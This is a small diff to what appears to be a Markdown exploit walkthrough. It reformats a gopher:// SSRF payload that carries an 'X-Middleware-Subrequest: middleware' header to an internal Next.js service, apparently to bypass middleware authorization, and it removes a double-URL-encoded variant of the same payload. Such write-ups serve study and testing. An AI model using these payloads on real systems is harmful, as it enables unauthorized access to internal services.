@@ -128,16 +128,13 @@ X-Middleware-Subrequest: middleware
         - ☑️ Convert `&` into `%26`
         - ☑️ Line Ending should be **CRLF**
 
-        ```
-        gopher://127.0.0.1:10000/_GET /customapi HTTP/1.1
-        Host:127.0.0.1:10000
-        X-Middleware-Subrequest: middleware
+```
+gopher://127.0.0.1:10000/_GET /customapi HTTP/1.1
+Host:127.0.0.1:10000
+X-Middleware-Subrequest: middleware
 
-        ```
+```
 
 ![gopher ssrf](images/15-next-js-exploit.png)
 
-        ```
-        gopher://127.0.0.1:10000/_GET%2520/customapi%2520HTTP/1.1%250D%250AX-Middleware-Subrequest:%2520middleware%250D%250A
-        ```
 
